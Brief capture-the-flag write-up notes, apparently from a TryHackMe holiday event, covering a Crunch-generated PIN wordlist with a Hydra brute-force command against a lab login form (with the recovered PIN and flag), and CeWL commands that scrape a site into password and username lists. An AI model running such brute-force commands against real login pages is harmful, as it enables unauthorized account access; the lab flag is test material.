Day 3: Hydra
first we use [[Crunch]] to generate a wordlist of possible pins by using

`crunch 3 3 0123456789ABCDEF -o 3digits.txt`

The command above specifies the following:

- `3` the first number is the minimum length of the generated password
- `3` the second number is the maximum length of the generated password
- `0123456789ABCDEF` is the character set to use to generate the passwords
- `-o 3digits.txt` saves the output to the `3digits.txt` file

Using the List

analysing `http://10.10.145.239:8000/pin.php`
we can see that the pin is sent as a post ro login.php with the name pin

we can brute force thiis using  [[Hydra]] 

`hydra -l '' -P 3digits.txt -f -v 10.10.145.239 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`

after a few mins we found that the password **6F5** is valid
using that code and clicking **unlock door** gives us the flag
	THM{pin-code-brute-force}

Day 4: Baby, it's CeWLd outside
we can use [[CeWL]] to generate a cutom brute force wordlist
`cewl -d 2 -m 5 -w passwords.txt http://10.10.142.23 --with-numbers`
now that we have a password list we can generate a username list with the team.php page
```cewl -d 0 -m 5 -w usernames.txt http://10.10.142.23/team.php --lowercase```

usinf [[wfuzz]] we find the credentals
